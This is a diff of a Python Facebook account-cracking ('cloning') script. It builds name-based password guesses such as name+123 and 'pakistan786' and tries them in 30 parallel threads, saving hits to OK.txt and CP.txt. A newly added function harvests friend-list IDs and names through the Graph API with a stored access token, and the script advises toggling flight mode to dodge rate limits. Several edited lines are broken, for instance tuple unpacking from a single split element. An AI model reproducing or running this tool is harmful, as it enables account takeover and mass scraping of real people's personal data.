@@ -232,33 +232,23 @@ def passmenu():
 		
 def first():
 	clear()
-	print(logo);print( '\n- - - - - - - - - - - - - - - - - - - - - - - - - - -\n [!] OK Result Saved To : \033[1;92mOK.txt/%s\033[1;97m\n [!] CP Result Saved To : \033[1;91mCP.txt/%s\033[1;97m\n- - - - - - - - - - - - - - - - - - - - - - - - - - -\n [!] \033[1;96m~Use Flight Mode 5 Second After Every 10 mint~\033[1;0m\n- - - - - - - - - - - - - - - - - - - - - - - - - - -\n'%(okc,cpc))
+	print(logo)
+	print("\033[1;37m\rEnter Last Name Digits\033[1;37m\n")
+	p1 = input('  Name + 1 : ')
+	p2 = input('  Name + 2 : ')
+	p3 = input('  Name + 3 : ')
+	p4 = input('  Name + 4 : ')
+	os.system("clear")
+	print(logo)
+	print( '\n- - - - - - - - - - - - - - - - - - - - - - - - - - -\n [!] OK Result Saved To : \033[1;92mOK.txt/%s\033[1;97m\n [!] CP Result Saved To : \033[1;91mCP.txt/%s\033[1;97m\n- - - - - - - - - - - - - - - - - - - - - - - - - - -\n [!] \033[1;96m~Use Flight Mode 5 Second After Every 10 mint~\033[1;0m\n- - - - - - - - - - - - - - - - - - - - - - - - - - -\n'%(okc,cpc))
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
-			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
-			first,last = nmf.split(' ')[0],nmf.split(' ')[1]
-			pwv = []
-			if len(first+ last)<6:
-				if len(first)<3:
-					pass
-				else:
-					pwv.append(first+last)
-					pwv.append(first+'123')
-					pwv.append(first+'12345')
-					pwv.append(last+'123')
-					pwv.append(last+'12345')
+			idf,nmf = yuzong.split('|')[0]
+			xz = nmf.split(' ')
+			if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
+				pwv = [nmf, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
 			else:
-				if len(first<3):
-					pwv.append(nmf)
-				else:
-					pwv.append(nmf)
-					pwv.append(first+last+'12')
-					pwv.append(first+last+'786')
-					pwv.append('445566')
-					pwv.append('112233')
-					pwv.append('786786')
-					pwv.append('pakistan786')
-					pwv.append('123456')
+				pwv = [nmf, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
 			if 'mobile' in method:
 				pool.submit(crack,idf,pwv)
 			elif 'free' in method:
@@ -279,10 +269,10 @@ def name():
 				firsts = first.capitalize()
 				lasts = last.capitalize()
 				if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-					pwv = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
+					pwv = [firstl+' '+lastl,firsts+' '+lasts,xz[0]+"12345",xz[0]+"123"]
 				else:
-					pwv = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
-					pwv = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
+					pwv = [firstl+' '+lastl,firsts+' '+lasts,xz[0]+"12345",xz[0]+"123"]
+					pwv = [firstl+' '+lastl,firsts+' '+lasts,xz[0]+"12345",xz[0]+"123"]
 				if 'mobile' in method:
 					pool.submit(crack,idf,pwv)
 				elif 'free' in method:
@@ -297,7 +287,7 @@ def name2():
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
-			first,last = nmf.split(' ')[0],nmf.split(' ')[1]
+			first,last = nmf.split(' ')[0]
 			firstl = first.lower()
 			lastl = last.lower()
 			firsts = first.capitalize()
@@ -321,9 +311,9 @@ def name2():
 def create_file():
     os.system('clear')
     print(logo)
-    print('  [1] Create file manual')
-    print('  [2] Create file auto')
-    print('  [B] Back to main menu')
+    print('  [1] CREAT FILE MANUAL')
+    print('  [2] CREAT FILE AUTO')
+    print('  [B] BACK')
     print(50*'-')
     cf = input('  Choose method: ')
     if cf =='1':
@@ -338,7 +328,6 @@ def create_file():
         print('\n  Choose correct option ...')
         time.sleep(1)
         create_file()
-
 def manual():
     try:
         token = open('/sdcard/tokenofl.txt', 'r').read()
@@ -380,7 +369,117 @@ def manual():
     print('  Ids saved as: '+save_file)
     print(50*'-')
     input(' Press enter to back')
-    sarfraz()	
+    baloch()
+def auto():
+    os.system('rm -rf temp*')
+    try:
+        access_token = open('/sdcard/tokenofl.txt', 'r').read()
+    except:
+        login()
+    try:
+        r = requests.get('https://graph.facebook.com/me?access_token='+access_token).text
+        q = json.loads(r)
+        uname = q['name']
+    except:
+        login()
+    os.system('clear')
+    print(logo)
+    print('  Logged user: '+uname)
+    print(50*'-')
+    nusrat = []
+    try:
+        limit_user = int(input('  How many ids do you want to add ? '))
+    except:
+        limit_user = 1
+    count = 0
+    for fir in range(limit_user):
+        count +=1
+        udit = input('  Put id%s: '%(count))
+        try:
+            tfile = open('/sdcard/tokenofl.txt','r').read()
+            fr = requests.get('https://graph.facebook.com/'+udit+'/friends?limit=5000&access_token='+tfile).text
+            qfr = json.loads(fr)
+            temp_save = open('temp.txt', 'a')
+            for data in qfr['data']:
+                uids = data['id']
+                if uids in nusrat:
+                    pass
+                else:
+                    nusrat.append(uids)
+                    temp_save.write(uids+'\n')
+            temp_save.close()
+        except KeyError:
+            if 'invalid' in str(fr):
+                print('  Logged token has expired ...')
+                pass
+            else:
+                print('  No friends found for user: '+udit)
+                pass
+    os.system('clear')
+    print(logo)
+    print('   Total ids: '+str(len(nusrat)))
+    print(50*'-')
+    try:
+        ask_link = int(input('  How many links do you want to grab? '))
+    except:
+        ask_link = 1
+    completed = 0
+    for links in range(ask_link):
+        completed +=1
+        li = input('  %s Link start with: '%completed)
+        os.system('cat temp.txt | grep "'+li+'" >> temp2.txt')
+    save_file = input('  Save file as: ')
+    os.system('clear')
+    lines = open('temp2.txt', 'r').readlines()
+    print(logo)
+    print('  Total ids to grab: '+str(len(lines)))
+    print('  Grabbing Process has started')
+    print(50*'-')
+    fileid = 'temp2.txt'
+    fileidopen = open(fileid, 'r').read().splitlines()
+    dill = []
+    for ids in fileidopen:
+        try:
+            tfile = open('/sdcard/tokenofl.txt','r').read()
+            rg = requests.get('https://graph.facebook.com/'+ids+'/friends?limit=5000&access_token='+tfile).text
+            rgq = json.loads(rg)
+            idsave=open('/sdcard/'+save_file, 'a')
+            for inayat in rgq['data']:
+                uids = inayat['id']
+                dill.append(uids)
+                nm = inayat['name']
+                first_name = nm.split(' ')[0]
+                try:
+                    last_name = nm.split(' ')[1]
+                except:
+                    last_name = 'Khan'
+                idsave.write(uids+'|'+first_name+'|'+last_name+'\n')
+            print('  Grabbed from: '+ids)
+           # print('  Total friends: '+str(len(uids)))
+            print('  Token status: Live')
+            print(50*'-')
+            idsave.close()
+        except Exception as e:
+            #print(e)
+            if 'invalid' in str(rg):
+                print('  Token has expired, try again ...')
+                os.system('rm -rf temp*')
+                pass
+            else:
+                print('  Grabbed from: '+ids)
+                print('  Friendlist ids: 0')
+                print('  Token status: Live')
+                print(50*'-')
+                os.system('rm -rf temp*')
+                pass
+    lenid = open('/sdcard/'+save_file, 'r').readlines()
+    print('  Grabbing Process has completed ')
+    os.system('rm -rf temp*')
+    print('  Total ids grabbed: '+str(len(lenid)))
+    print('  File saved as: /sdcard/'+save_file)
+    print(50*'-')
+    input('  Press enter to back ')
+    baloch()
 # CRACKER
 def crack(idf,pwv):
 	global loop,ok,cp
@@ -470,17 +569,17 @@ logo = """
  
     
 
- 888    d8P   888       888    8888888b.        
- 888   d8P    888       888    888   "Y88b       
- 888  d8P     888       888    888     888           
- 888d88K      8888888888888    888     888    
- 8888888b     888       888    888     888      
- 888  Y88b    888.      888    888     888      
- 888   Y88b   888       888    888  . d88P       
- 888    Y88b  888       888.   8888888P" 302
+ \x1b[1;97m888    d8P   888       888    8888888b.        
+ \x1b[1;97m888   d8P    888       888    888   "Y88b       
+\x1b[1;97m 888  d8P     888       888    888     888           
+ \x1b[1;97m888d88K      8888888888888    888     888    
+ \x1b[1;97m8888888b     888       888    888     888      
+ \x1b[1;97m888  Y88b    888       888    888     888      
+ \x1b[1;97m888   Y88b   888       888    888    d88P       
+ \x1b[1;97m888    Y88b  888       888    8888888P" 302
                                                                                
 \x1b[1;97m--------------------------------------------------
-\33[1;41m      KHD-302 X RSU BRAND REAL FATHER OF HITTLER    \33[0m
+\33[1;41m      KHD-302 X RSU BRAND REAL FATHER OF HITTLER  \33[0m
 \x1b[1;97m--------------------------------------------------
 \x1b[1;97m[+] AUTHOR         : KHD 302 BRAND
 \x1b[1;97m[+] FB PAGE.       : ZEE BALOCH
@@ -489,7 +588,6 @@ logo = """
 \x1b[1;97m[+] VERSION        :\x1b[1;97m 0.1  \x1b[1;97m          
 \x1b[1;97m--------------------------------------------------
 """
- 
 class Main:
 	def __init__(self):
 		self.id = []
@@ -498,14 +596,14 @@ class Main:
 		self.loop = 0
 		os.system("clear")
 		print(logo)
-		print(" [+]CLONING MENU")
-		print("\033[1;37m- - - - - - - - - - - - - - - - - - - - - - - - - - -")
-		print(" \033[1;32m[1]\033[0;92m FILE CLONING ")
-		print(" \033[1;32m[2] FILE CREAT(UNDER WORK)")
-		print(" \033[1;32m[3] PUBLIC ID CLONING(UNDER WORK)")
-		print(" \033[1;32m[4] PAK RENDOM CLONING ")
-		print(" \33[1;32m[5] OLD IDZ ")
-		print("\033[1;32m [E] EXIT \n")
+		print(" \033[1;37m[+]WELCOME IN CLONING MENU")
+		print("\033[1;37m--------------------------------------------------")
+		print(" \033[1;37m[1]\033[0;92m FILE CLONING ")
+		print(" \033[1;37m[2] FILE CREAT(UNDER WORK)")
+		print(" \033[1;37m[3] PUBLIC ID CLONING(UNDER WORK)")
+		print(" \033[1;37m[4] PAK RENDOM CLONING ")
+		print(" \33[1;37m[5] OLD IDZ ")
+		print("\033[1;37m [E] EXIT \n")
 		ZEE =input(" \033[1;32mSELECT : ")
 		if ZEE in ["1", "01"]:
 			File()
